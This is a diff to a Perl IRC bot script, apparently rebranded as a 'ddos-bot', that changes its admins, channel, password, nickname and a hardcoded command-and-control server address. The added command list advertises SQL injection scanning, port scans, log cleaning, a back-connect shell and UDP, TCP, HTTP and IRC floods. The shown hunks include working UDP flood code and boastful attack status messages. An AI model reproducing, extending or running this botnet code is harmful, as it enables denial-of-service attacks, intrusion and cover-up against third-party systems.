@@ -1,12 +1,104 @@
 #!/usr/bin/perl 
-#Perl Arhive by P1NNgU
+
+#################################### 
+
+# Design By Lupu
+
+#-[Zr Commands List]- 
+
+#-----[Hacking Based]----- 
+
+# -zr @multiscan <vuln> <dork> 
+
+# -zr @socks5 
+
+# -zr @sql2 <vuln> <dork> <col> 
+
+# -zr @portscan <ip> 
+
+# -zr @logcleaner 
+
+# -zr @sendmail <subject> <sender> <recipient> <message> 
+
+# -zr @system 
+
+# -zr @cleartmp 
+
+# -zr @rootable 
+
+# -zr @nmap <ip> <beginport> <endport> 
+
+# -zr @back <ip><port>   
+
+# -zr @linuxhelp 
+
+# -zr @cd tmp:. | for example 
+
+#-----[Advisory-New Based]----- 
+
+# -zr @packetstorm 
+
+# -zr @milw0rm 
+
+#-----[DDos Based]----- 
+
+# -zr @udpflood <host> <packet size> <time> 
+
+# -zr @tcpflood <host> <port> <packet size> <time> 
+
+# -zr @httpflood <host> <time> 
+
+# -zr @sqlflood <host> <time> 
+
+#-----[IRC Based]----- 
+
+# -zr @killme   
+
+# -zr @join #channel 
+
+# -zr @part #channel 
+
+# -zr @reset 
+
+# -zr @voice <who> 
+
+# -zr @owner <who> 
+
+# -zr @deowner <who> 
+
+# -zr @devoice <who> 
+
+# -zr @halfop <who> 
+
+# -zr @dehalfop <who> 
+
+# -zr @op <who> 
+
+# -zr @deop <who> 
+
+#-----[Flooding Based]----- 
+
+# -zr @msgflood <who> 
+
+# -zr @dccflood <who> 
+
+# -zr @ctcpflood <who> 
+
+# -zr @noticeflood <who> 
+
+# -zr @channelflood 
+
+# -zr @maxiflood <who> 
+
+#################################### 
+
 #################################### 
 
 my $processo = 'https'; 
 
-my $linas_max='100'; 
+my $linas_max='10'; 
 
-my $sleep='50'; 
+my $sleep='5'; 
 
 my $cmd=""; 
 
@@ -14,31 +106,33 @@ my $id="";
 
 ############################################ 
 
-my @adms=("Hun","P1NNgU"); 
+my @adms=("Hun"); 
 
-my @canais=("#x"); 
+my @hostauth = ("werwolf96.users.undernet.org");
 
-my $chanpass = "-pinguin"; 
+my @canais=("#flood"); 
+
+my $chanpass = "-zr"; 
 
 ##Cron 
 
-$num = int rand(100000); 
+$num = int rand(10000); 
 
-my $nick = "[UDP][P1NNgU-BOT][PERL][A]" . $num . ""; 
+my $nick = "ddos-bot" . $num . ""; 
 
   
 
 #Nickname of bot  
 
-my $ircname ='ddos'; 
+my $ircname ='[Protection]'; 
 
-chop (my $realname = '[[x_x]]-'); 
+chop (my $realname = '[Protection]-'); 
 
 #IRC name and Realname  
 
 $servidor='78.129.172.35' unless $servidor; 
 
-my $porta='6667';
+my $porta='6667';  
 
 ############################################ 
 
@@ -396,15 +490,15 @@ sub bfunc {
 
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] "); 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-nr1 14@3udpflood <host> <packet size> <time>"); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3udpflood <host> <packet size> <time>"); 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-nr1 14@3udp <host> <port> <packet size> <time>"); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3udp <host> <port> <packet size> <time>"); 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-nr1 14@3tcpflood <host> <port> <packet size> <time>"); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3tcpflood <host> <port> <packet size> <time>"); 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-nr1 14@3httpflood <host> <time>");  
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3httpflood <host> <time>");  
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-nr1 14@3sqlflood <host> <time>"); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sqlflood <host> <time>"); 
 
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] "); 
 
@@ -2185,7 +2279,7 @@ if ($funcarg =~ /^maxiflood(.*)/) {
 
 if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) { 
 
-           sendraw($IRC_cur_socket, "PRIVMSG $printl :13[4@3UDP][DARK-DDOS][PERL][A13] [UDP][DARK-DDOS][PERL][A]DARK-DDOS a inceput sa atace;4 ".$1.":".$2." 13PE 4 ".$3." 13SECUNDE."); 
+           sendraw($IRC_cur_socket, "PRIVMSG $printl :13[4@3UDP-DDOS13] ATACKU-L A INCEPUT 4 ".$1.":".$2." 13PE 4 ".$3." 13SECUNDE."); 
 
            $iaddr = inet_aton("$1") or die "Fuck wrong ip"; 
 
@@ -2203,7 +2297,7 @@ if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
 
            send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($2, $iaddr));} 
 
-           sendraw($IRC_cur_socket,"PRIVMSG $printl :13[4@3UDP][DARK-DDOS][PERL][Af13] Atacul s-a terminat #DARK-DDOS 4 ".$1.":".$2."."); 
+           sendraw($IRC_cur_socket,"PRIVMSG $printl :13[4@3UDP-DDOS13] ATACKU-L A LOAT SFARSIT CU SUCCES MUIE HAXORE-II 4 ".$1.":".$2."."); 
 
   } 
 
@@ -2531,7 +2625,7 @@ exit;
 
          if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) { 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP FLOOD 12:.4|12 Ataca 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds ."); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds ."); 
 
             my $itime = time; 
 
@@ -2569,7 +2663,7 @@ exit;
 
          if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) { 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3[UDP][DARK-DDOS][PERL][A]12:.4|12 [DARK-DDOS #PERL] Ataca 4 ".$1." 12 CU 4 ".$2." 12 Kb PACHETE PE 4 ".$3." 12 SECUNDE."); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3UDP ZR12:.4|12 ATACAM BY.ZR 4 ".$1." 12 CU 4 ".$2." 12 Kb PACHETE PE 4 ".$3." 12 SECUNDE."); 
 
             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3"); 
 
@@ -2587,7 +2681,7 @@ exit;
 
             $bytes{tcp} = $2 * $pacotes{tcp}; 
 
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3UDP][DARK-DDOS][PERL][A12]12 12REZULTAT4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12KB IN4 ".$dtime." 12SECUNDE PE4 ".$1."."); 
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3UDP-ZR12]12 12REZULTAT4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12KB IN4 ".$dtime." 12SECUNDE PE4 ".$1."."); 
 
          } 
 
